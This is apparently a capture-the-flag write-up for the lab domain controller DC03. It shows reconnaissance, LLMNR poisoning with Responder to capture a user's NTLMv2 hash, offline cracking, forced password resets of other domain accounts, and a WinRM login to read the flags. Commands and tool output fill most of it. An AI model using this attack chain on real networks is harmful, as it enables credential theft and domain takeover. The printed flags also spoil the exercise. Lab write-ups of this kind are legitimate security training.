# DC03

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.73:53
Open 10.0.2.73:88
Open 10.0.2.73:135
Open 10.0.2.73:389
Open 10.0.2.73:445
Open 10.0.2.73:464
Open 10.0.2.73:593
Open 10.0.2.73:139
Open 10.0.2.73:5985
Open 10.0.2.73:9389
nOpen 10.0.2.73:49664
Open 10.0.2.73:49668
Open 10.0.2.73:49680
Open 10.0.2.73:49707
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.73

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-10-04 18:24:20Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49680/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49707/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-04T18:25:09
|_  start_date: N/A
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:51:ab:5f (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   DC01<00>             Flags: <unique><active>
|   SOUPEDECODE<00>      Flags: <group><active>
|   SOUPEDECODE<1c>      Flags: <group><active>
|   SOUPEDECODE<1b>      Flags: <unique><active>
|   DC01<20>             Flags: <unique><active>
| Statistics:
|   08:00:27:51:ab:5f:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56859/tcp): CLEAN (Timeout)
|   Check 2 (port 18473/tcp): CLEAN (Timeout)
|   Check 3 (port 51371/udp): CLEAN (Timeout)
|   Check 4 (port 23554/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 10h59m56s
```
:::

```bash
└─$ enum4linux-ng 10.0.2.73
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.0.2.73
[*] Username ......... ''
[*] Random Username .. 'vonvdhgr'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ==================================
|    Listener Scan on 10.0.2.73    |
 ==================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =================================================
|    Domain Information via LDAP for 10.0.2.73    |
 =================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: SOUPEDECODE.LOCAL

 ========================================================
|    NetBIOS Names and Workgroup/Domain for 10.0.2.73    |
 ========================================================
[+] Got domain/workgroup name: SOUPEDECODE
[+] Full NetBIOS names information:
- DC01            <00> -         B <ACTIVE>  Workstation Service
- SOUPEDECODE     <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- SOUPEDECODE     <1c> - <GROUP> B <ACTIVE>  Domain Controllers
- SOUPEDECODE     <1b> -         B <ACTIVE>  Domain Master Browser
- DC01            <20> -         B <ACTIVE>  File Server Service
- MAC Address = 08-00-27-51-AB-5F

 ======================================
|    SMB Dialect Check on 10.0.2.73    |
 ======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ========================================================
|    Domain Information via SMB session for 10.0.2.73    |
 ========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: SOUPEDECODE
DNS domain: SOUPEDECODE.LOCAL
FQDN: DC01.SOUPEDECODE.LOCAL
Derived membership: domain member
Derived domain: SOUPEDECODE

 ======================================
|    RPC Session Check on 10.0.2.73    |
 ======================================
[*] Check for null session
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE
[-] Sessions failed, neither null nor user sessions were possible

 ============================================
|    OS Information via RPC for 10.0.2.73    |
 ============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 0.72 seconds
```

## LLMNR Poisoning

**LLMNR Poisoning** is a man-in-the-middle attack that exploits the Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) protocols. When a system fails to find a host using DNS (e.g., due to a typo), it broadcasts a request using these protocols asking, "Has anyone seen this computer?" An attacker on the network can respond to this broadcast, claiming to be the requested host. This forces the victim to send their username and NTLMv2 hash to the attacker, who can then crack it offline or relay it for unauthorized access.

```bash
└─$ sudo responder -I eth0
...
[*] [NBT-NS] Poisoned answer sent to 10.0.2.73 for name FILESERVER (service: File Server)
[*] [LLMNR]  Poisoned answer sent to fe80::18c9:3e68:6ba5:a9f8 for name FileServer
[*] [MDNS] Poisoned answer sent to 10.0.2.73       for name FileServer.local
[*] [LLMNR]  Poisoned answer sent to fe80::18c9:3e68:6ba5:a9f8 for name FileServer
[*] [LLMNR]  Poisoned answer sent to 10.0.2.73 for name FileServer
[*] [LLMNR]  Poisoned answer sent to 10.0.2.73 for name FileServer
[*] [MDNS] Poisoned answer sent to fe80::18c9:3e68:6ba5:a9f8 for name FileServer.local
[*] [MDNS] Poisoned answer sent to fe80::18c9:3e68:6ba5:a9f8 for name FileServer.local
[*] [MDNS] Poisoned answer sent to 10.0.2.73       for name FileServer.local
[SMB] NTLMv2-SSP Client   : fe80::18c9:3e68:6ba5:a9f8
[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:625220824b1f9d87:4FB29DC40A8FC9E98C414BFB1129D252:01010000000000008001B54ADF34DC014FE1AB500F1033B6000000000200080036004F0054004A0001001E00570049004E002D0051004B00420031004D004F003900320039003200420004003400570049004E002D0051004B00420031004D004F00390032003900320042002E0036004F0054004A002E004C004F00430041004C000300140036004F0054004A002E004C004F00430041004C000500140036004F0054004A002E004C004F00430041004C00070008008001B54ADF34DC01060004000200000008003000300000000000000000000000004000000CAF70221922A9A046273DF27F3D330C272CC14AADFE93CBBAC40C4BFE6F420C0A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000
```

**Scene:** A busy corporate network. The Domain Controller (DC) is the popular kid, the "Daddy" of the domain. Everyone trusts him implicitly.

- **The Mistake:** A tired sysadmin, running on their fourth cup of coffee, tries to connect to a network share. They type `\\filserver` instead of `\\fileserver`. A simple, human error.
    
- **The DNS Query:** The admin's computer first asks the official DNS server, "Hey, where's `filserver`?" The DNS server, a literal-minded bureaucrat, checks its records and replies, "Never heard of it. Not in my files. POUND SAND."
    
- **The Desperate Shout (LLMNR/NBT-NS):** Instead of giving up, the admin's computer does something... reckless. It stands up in the middle of the crowded network café (the broadcast domain) and YELLS, **"OI! HAS ANYONE SEEN 'FILSERVER'? I REALLY NEED TO TALK TO HIM!"**
    
- **The Attack (The Poison):** You, the charmingly evil pentester, are listening to this entire conversation. You immediately jump up, point to yourself, and shout back, **"YEAH, THAT'S ME! I'M FILSERVER! SEND THE SECRET HANDSHAKE (NTLMv2 HASH) OVER HERE, BUDDY!"**
    
- **Why It Works:** The DC's network, built on blind trust, has one golden rule: _The first one to answer a shout gets the prize._ There's no ID check. The admin's computer, just happy to get a response, doesn't verify your identity. It happily sends over the user's cryptographic secret handshake (their password hash) directly to you, the impostor.

```bash
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
jesuschrist      (xkate578)
```

## SMB

```bash
└─$ netexec smb soupedecode.local -u 'xkate578' -p 'jesuschrist' --shares
SMB         10.0.2.73       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.73       445    DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist
SMB         10.0.2.73       445    DC01             [*] Enumerated shares
SMB         10.0.2.73       445    DC01             Share           Permissions     Remark
SMB         10.0.2.73       445    DC01             -----           -----------     ------
SMB         10.0.2.73       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.73       445    DC01             C$                              Default share
SMB         10.0.2.73       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.73       445    DC01             NETLOGON        READ            Logon server share
SMB         10.0.2.73       445    DC01             share           READ,WRITE
SMB         10.0.2.73       445    DC01             SYSVOL          READ            Logon server share
```

```bash
└─$ impacket-smbclient 'soupedecode.local'/'xkate578':'jesuschrist'@'soupedecode.local'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use share
# ls
drw-rw-rw-          0  Sat Oct  4 14:36:54 2025 .
drw-rw-rw-          0  Thu Aug  1 01:38:08 2024 ..
-rw-rw-rw-        282  Thu Aug  1 01:38:08 2024 desktop.ini
-rw-rw-rw-         70  Thu Aug  1 01:39:25 2024 user.txt
```

### User.txt

```
# cat user.txt
12f54a96f64443246930da001cafda8b
```

## Lateral Movement

### Bloodhound

Gather information about domain
```bash
└─$ rusthound-ce --domain soupedecode.local -u xkate578 -p 'jesuschrist' -z -f dc01.soupedecode.local
```

Phew... 1094 Outbound Object Control will not be easy to narrow down for specific attack.

- [https://www.thehacker.recipes/ad/movement/builtins/security-groups#practice](https://www.thehacker.recipes/ad/movement/builtins/security-groups#practice)

![writeup.png](/assets/pentest/hackmyvm/dc03/writeup.png)

There's another user `fbeth103` which is considered **High Value Object**

![writeup-1.png](/assets/pentest/hackmyvm/dc03/writeup-1.png)

```bash
└─$ bloodyAD -u 'xkate578' -p 'jesuschrist' -d 'soupedecode.local' --host 'dc01.soupedecode.local' --dc-ip 10.0.2.73 set password 'fbeth103' 'Password123$'
...
msldap.commons.exceptions.LDAPModifyException: Password cant be changed. It may be because the oldpass provided is not valid.
You can try to use another password change protocol such as smbpasswd, server error may be more explicit.

└─$ netexec smb soupedecode.local -u 'xkate578' -p 'jesuschrist' -M change-password -o USER='fbeth103' NEWPASS='Password123$'
SMB         10.0.2.73       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.73       445    DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist
CHANGE-P... 10.0.2.73       445    DC01             [-] SMB-SAMR password change failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

└─$ impacket-changepasswd 'soupedecode.local'/'fbeth103'@'10.0.2.73' -altuser 'xkate578' -altpass 'jesuschrist' -newpass 'Password123$' -reset

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Setting the password of soupedecode.local\fbeth103 as soupedecode.local\xkate578
[*] Connecting to DCE/RPC as soupedecode.local\xkate578
[-] soupedecode.local\xkate578 user is not allowed to set the password of the target
```

Hmmm...

We can change password of other users, but not `fbeth103`. Could it be because it's part of **Protected Groups**?
```bash
└─$ netexec smb soupedecode.local -u 'xkate578' -p 'jesuschrist' -M change-password -o USER='faiden857' NEWPASS='Password123$'
SMB         10.0.2.73       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.73       445    DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist
CHANGE-P... 10.0.2.73       445    DC01             [+] Successfully changed password for faiden857

└─$ netexec smb soupedecode.local -u 'faiden857' -p 'Password123$'
SMB         10.0.2.73       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.73       445    DC01             [+] SOUPEDECODE.LOCAL\faiden857:Password123$
```

![writeup-2.png](/assets/pentest/hackmyvm/dc03/writeup-2.png)

![](https://media.tenor.com/So_wSVwEzmYAAAAM/cat-died.gif)

```bash
└─$ netexec smb soupedecode.local -u 'xkate578' -p 'jesuschrist' -M change-password -o USER='fbeth103' NEWPASS='Password123$'
SMB         10.0.2.74       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.74       445    DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist
CHANGE-P... 10.0.2.74       445    DC01             [+] Successfully changed password for fbeth103
```

![](https://media.tenor.com/So_wSVwEzmYAAAAM/cat-died.gif)

## Flags

```bash
└─$ evil-winrm-py -i soupedecode.local -u 'fbeth103' -p 'Password123$'
[*] Connecting to 'soupedecode.local:5985' as 'fbeth103'
evil-winrm-py PS C:\Users\fbeth103\Documents> ls /Users -Recurse -File -Filter *.txt | % { echo $_.FullName; cat $_.FullName; echo ""; }
C:\Users\Administrator\Desktop\root.txt
b8e59a7d4020792c412da75e589ff4fc

C:\Users\xkate578\Desktop\user.txt
12f54a96f64443246930da001cafda8b
```